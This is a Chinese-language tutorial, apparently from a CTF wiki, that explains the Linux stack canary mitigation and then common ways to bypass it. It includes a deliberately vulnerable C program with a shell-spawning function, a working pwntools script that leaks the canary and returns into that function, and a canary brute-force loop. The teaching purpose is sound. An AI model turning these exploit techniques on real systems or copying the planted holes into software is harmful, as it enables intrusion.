# Canary

## 介紹 
Canary 的意思是金絲雀，來源於英國礦井工人用來探查井下氣體是否有毒的金絲雀籠子。工人們每次下井都會帶上一隻金絲雀。如果井下的氣體有毒，金絲雀由於對毒性敏感就會停止鳴叫甚至死亡，從而使工人們得到預警。

我們知道，通常棧溢出的利用方式是通過溢出存在於棧上的局部變量，從而讓多出來的數據覆蓋 ebp、eip 等，從而達到劫持控制流的目的。棧溢出保護是一種緩衝區溢出攻擊緩解手段，當函數存在緩衝區溢出攻擊漏洞時，攻擊者可以覆蓋棧上的返回地址來讓 shellcode 能夠得到執行。當啓用棧保護後，函數開始執行的時候會先往棧底插入 cookie 信息，當函數真正返回的時候會驗證 cookie 信息是否合法(棧幀銷燬前測試該值是否被改變)，如果不合法就停止程序運行(棧溢出發生)。攻擊者在覆蓋返回地址的時候往往也會將 cookie 信息給覆蓋掉，導致棧保護檢查失敗而阻止 shellcode 的執行，避免漏洞利用成功。在 Linux 中我們將 cookie 信息稱爲 Canary。

由於 stack overflow 而引發的攻擊非常普遍也非常古老，相應地一種叫做 Canary 的 mitigation 技術很早就出現在 glibc 裏，直到現在也作爲系統安全的第一道防線存在。

Canary 不管是實現還是設計思想都比較簡單高效，就是插入一個值在 stack overflow 發生的高危區域的尾部。當函數返回之時檢測 Canary 的值是否經過了改變，以此來判斷 stack/buffer overflow 是否發生。

Canary 與 Windows 下的 GS 保護都是緩解棧溢出攻擊的有效手段，它的出現很大程度上增加了棧溢出攻擊的難度，並且由於它幾乎並不消耗系統資源，所以現在成了 Linux 下保護機制的標配。


## Canary 原理
### 在 GCC 中使用 Canary
可以在 GCC 中使用以下參數設置 Canary:

```
-fstack-protector 啓用保護，不過只爲局部變量中含有數組的函數插入保護
-fstack-protector-all 啓用保護，爲所有函數插入保護
-fstack-protector-strong
-fstack-protector-explicit 只對有明確 stack_protect attribute 的函數開啓保護
-fno-stack-protector 禁用保護
```

### Canary 實現原理

開啓 Canary 保護的 stack 結構大概如下：

```
        High
        Address |                 |
                +-----------------+
                | args            |
                +-----------------+
                | return address  |
                +-----------------+
        rbp =>  | old ebp         |
                +-----------------+
      rbp-8 =>  | canary value    |
                +-----------------+
                | local variables |
        Low     |                 |
        Address

```
當程序啓用 Canary 編譯後，在函數序言部分會取 fs 寄存器 0x28 處的值，存放在棧中 %ebp-0x8 的位置。
這個操作即爲向棧中插入 Canary 值，代碼如下：
```asm
mov    rax, qword ptr fs:[0x28]
mov    qword ptr [rbp - 8], rax
```

在函數返回之前，會將該值取出，並與 fs:0x28 的值進行異或。如果異或的結果爲 0，說明 Canary 未被修改，函數會正常返回，這個操作即爲檢測是否發生棧溢出。

```asm
mov    rdx,QWORD PTR [rbp-0x8]
xor    rdx,QWORD PTR fs:0x28
je     0x4005d7 <main+65>
call   0x400460 <__stack_chk_fail@plt>
```

如果 Canary 已經被非法修改，此時程序流程會走到 `__stack_chk_fail`。`__stack_chk_fail` 也是位於 glibc 中的函數，默認情況下經過 ELF 的延遲綁定，定義如下。

```C
eglibc-2.19/debug/stack_chk_fail.c

void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}

void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");
}
```

這意味可以通過劫持 `__stack_chk_fail` 的 got 值劫持流程或者利用 `__stack_chk_fail` 泄漏內容(參見 stack smash)。

進一步，對於 Linux 來說，fs 寄存器實際指向的是當前棧的 TLS 結構，fs:0x28 指向的正是 stack\_guard。
```C
typedef struct
{
  void *tcb;        /* Pointer to the TCB.  Not necessarily the
                       thread descriptor used by libpthread.  */
  dtv_t *dtv;
  void *self;       /* Pointer to the thread descriptor.  */
  int multiple_threads;
  uintptr_t sysinfo;
  uintptr_t stack_guard;
  ...
} tcbhead_t;
```
如果存在溢出可以覆蓋位於 TLS 中保存的 Canary 值那麼就可以實現繞過保護機制。

事實上，TLS 中的值由函數 security\_init 進行初始化。

```C
static void
security_init (void)
{
  // _dl_random的值在進入這個函數的時候就已經由kernel寫入.
  // glibc直接使用了_dl_random的值並沒有給賦值
  // 如果不採用這種模式, glibc也可以自己產生隨機數

  //將_dl_random的最後一個字節設置爲0x0
  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);
  
  // 設置Canary的值到TLS中
  THREAD_SET_STACK_GUARD (stack_chk_guard);

  _dl_random = NULL;
}

//THREAD_SET_STACK_GUARD宏用於設置TLS
#define THREAD_SET_STACK_GUARD(value) \
  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)

```


## Canary 繞過技術

### 序言
Canary 是一種十分有效的解決棧溢出問題的漏洞緩解措施。但是並不意味着 Canary 就能夠阻止所有的棧溢出利用，在這裏給出了常見的存在 Canary 的棧溢出利用思路，請注意每種方法都有特定的環境要求。

### 泄露棧中的 Canary
Canary 設計爲以字節 `\x00` 結尾，本意是爲了保證 Canary 可以截斷字符串。
泄露棧中的 Canary 的思路是覆蓋 Canary 的低字節，來打印出剩餘的 Canary 部分。
這種利用方式需要存在合適的輸出函數，並且可能需要第一溢出泄露 Canary，之後再次溢出控制執行流程。

#### 利用示例

存在漏洞的示例源代碼如下:

```C
// ex2.c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
void getshell(void) {
    system("/bin/sh");
}
void init() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
}
void vuln() {
    char buf[100];
    for(int i=0;i<2;i++){
        read(0, buf, 0x200);
        printf(buf);
    }
}
int main(void) {
    init();
    puts("Hello Hacker!");
    vuln();
    return 0;
}
```

編譯爲 32bit 程序並關閉 PIE 保護 （默認開啓 NX，ASLR，Canary 保護）

```bash
$ gcc -m32 -no-pie ex2.c -o ex2
```

首先通過覆蓋 Canary 最後一個 `\x00` 字節來打印出 4 位的 Canary
之後，計算好偏移，將 Canary 填入到相應的溢出位置，實現 Ret 到 getshell 函數中

```python
#!/usr/bin/env python

from pwn import *

context.binary = 'ex2'
#context.log_level = 'debug'
io = process('./ex2')

get_shell = ELF("./ex2").sym["getshell"]

io.recvuntil("Hello Hacker!\n")

# leak Canary
payload = "A"*100
io.sendline(payload)

io.recvuntil("A"*100)
Canary = u32(io.recv(4))-0xa
log.info("Canary:"+hex(Canary))

# Bypass Canary
payload = "\x90"*100+p32(Canary)+"\x90"*12+p32(get_shell)
io.send(payload)

io.recv()

io.interactive()
```
### one-by-one 爆破 Canary

對於 Canary，雖然每次進程重啓後的 Canary 不同(相比 GS，GS 重啓後是相同的)，但是同一個進程中的不同線程的 Canary 是相同的， 並且
通過 fork 函數創建的子進程的 Canary 也是相同的，因爲 fork 函數會直接拷貝父進程的內存。我們可以利用這樣的特點，徹底逐個字節將 Canary 爆破出來。
在著名的 offset2libc 繞過 linux64bit 的所有保護的文章中，作者就是利用這樣的方式爆破得到的 Canary:
這是爆破的 Python 代碼:

```python
print "[+] Brute forcing stack canary "

start = len(p)
stop = len(p)+8

while len(p) < stop:
   for i in xrange(0,256):
      res = send2server(p + chr(i))

      if res != "":
         p = p + chr(i)
         #print "\t[+] Byte found 0x%02x" % i
         break

      if i == 255:
         print "[-] Exploit failed"
         sys.exit(-1)


canary = p[stop:start-1:-1].encode("hex")
print "   [+] SSP value is 0x%s" % canary
```


### 劫持__stack_chk_fail函數
已知 Canary 失敗的處理邏輯會進入到 `__stack_chk_fail`ed 函數，`__stack_chk_fail`ed 函數是一個普通的延遲綁定函數，可以通過修改 GOT 表劫持這個函數。

參見 ZCTF2017 Login，利用方式是通過 fsb 漏洞篡改 `__stack_chk_fail` 的 GOT 表，再進行 ROP 利用

### 覆蓋 TLS 中儲存的 Canary 值

已知 Canary 儲存在 TLS 中，在函數返回前會使用這個值進行對比。當溢出尺寸較大時，可以同時覆蓋棧上儲存的 Canary 和 TLS 儲存的 Canary 實現繞過。

參見 StarCTF2018 babystack



